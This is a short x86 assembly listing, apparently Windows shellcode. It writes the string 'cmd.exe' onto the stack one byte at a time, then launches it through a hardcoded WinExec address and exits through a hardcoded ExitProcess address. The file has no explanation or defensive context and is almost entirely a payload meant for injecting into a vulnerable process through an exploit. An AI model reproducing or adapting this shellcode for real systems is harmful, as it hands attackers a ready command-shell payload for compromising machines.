BITS 32

section .data

section .text

global _start

_start:
push ebp
mov ebp, esp
xor eax, eax
mov byte al, 0x08
sub esp, eax
xor eax, eax
mov byte [ebp-0x08], 0x63
mov byte [ebp-0x07], 0x6d
mov byte [ebp-0x06], 0x64
mov byte [ebp-0x05], 0x2e
mov byte [ebp-0x04], 0x65
mov byte [ebp-0x03], 0x78
mov byte [ebp-0x02], 0x65
mov byte [ebp-0x01], al
lea ebx, [ebp - 0x08]
inc eax
push eax
push ebx
mov edx, 0x7c862aed ; winexec(cmd.exe)
call edx
xor eax, eax
inc eax
mov edx, 0x7c81cb12 ; exit(1)
call edx